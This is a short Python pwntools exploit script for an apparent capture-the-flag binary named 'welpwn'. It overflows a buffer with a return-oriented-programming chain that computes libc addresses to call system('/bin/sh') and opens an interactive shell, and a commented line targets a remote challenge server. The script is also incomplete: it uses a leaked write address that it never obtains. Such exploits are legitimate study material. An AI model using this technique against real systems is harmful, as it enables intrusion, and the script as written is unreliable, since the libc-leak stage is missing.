import pwn

pwn.context(arch='amd64', os='linux', log_level='debug')

p = pwn.process('./welpwn')
#p = pwn.remote('220.249.52.133', 36935)
e = pwn.ELF('./welpwn')

bss_addr = e.bss()
main_addr = pwn.p64(e.sym['main'])
puts_plt = pwn.p64(e.plt['puts'])
write_got = pwn.p64(e.got['write'])

pop_4_addr = pwn.p64(0x40089c)     # do pop for 4 times(24 Bytes) ; DON'T pop anything weird to $esp!
pop_rdi_addr = pwn.p64(0x4008a3)   # pop rdi ; ret

#pwn.gdb.attach(p)

#print(hex(write_addr))
#pwn.pause()

import LibcSearcher

libc = LibcSearcher.LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = pwn.p64(libc_base + libc.dump('system'))
sh_addr = pwn.p64(libc_base + libc.dump('str_bin_sh'))
#print(sh_addr)

payload = b'A' * 0x10 + b'B' * 8 + pop_4_addr + pop_rdi_addr + sh_addr + system_addr + main_addr
p.sendlineafter(b'Welcome to RCTF\n', payload)

#pwn.sleep(1)

p.interactive()
